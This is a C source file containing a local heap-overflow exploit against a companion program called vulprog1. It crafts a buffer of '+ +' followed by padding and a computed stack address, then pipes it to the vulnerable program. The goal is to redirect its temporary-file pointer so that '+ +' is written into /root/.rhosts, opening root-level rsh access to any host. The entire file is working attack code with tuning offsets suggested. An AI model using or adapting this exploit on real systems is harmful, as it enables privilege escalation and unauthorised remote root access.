#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 256
#define DIFF    16 /* estimated diff between buf/tmpfile in vulprog */

#define VULPROG "./vulprog1"
#define VULFILE "/root/.rhosts" /* the file 'buf' will be stored in */

/* get value of sp off the stack (used to calculate argv[1] address) */
u_long getesp()
{
  __asm__("movl %esp,%eax"); /* equiv. of 'return esp;' in C */
}

int main(int argc, char **argv)
{
  u_long addr;
  register int i;
  int mainbufsize;

  char *mainbuf, buf[DIFF+6+1] = "+ +\t# ";

  /* ------------------------------------------------------ */
  if (argc <= 1)
  {
    fprintf(stderr, "Usage: %s <offset> [try 310-330]\n", argv[0]);
    exit(1);
  }
  /* ------------------------------------------------------ */

  memset(buf, 0, sizeof(buf)), strcpy(buf, "+ +\t# ");
  memset(buf + strlen(buf), 'A', DIFF);
  addr = getesp() + atoi(argv[1]);

  /* reverse byte order (on a little endian system) */
  for (i = 0; i < sizeof(u_long); i++)
    buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);

  mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULFILE) + 13;
 
  mainbuf = (char *)malloc(mainbufsize);
  memset(mainbuf, 0, sizeof(mainbufsize));
  snprintf(mainbuf, mainbufsize - 1, "echo '%s' | %s %s\n", buf, VULPROG, VULFILE);

  printf("Overflowing tmpaddr to point to %p, check %s after.\n\n", addr, VULFILE);

  system(mainbuf);
  
  return 0;      
}
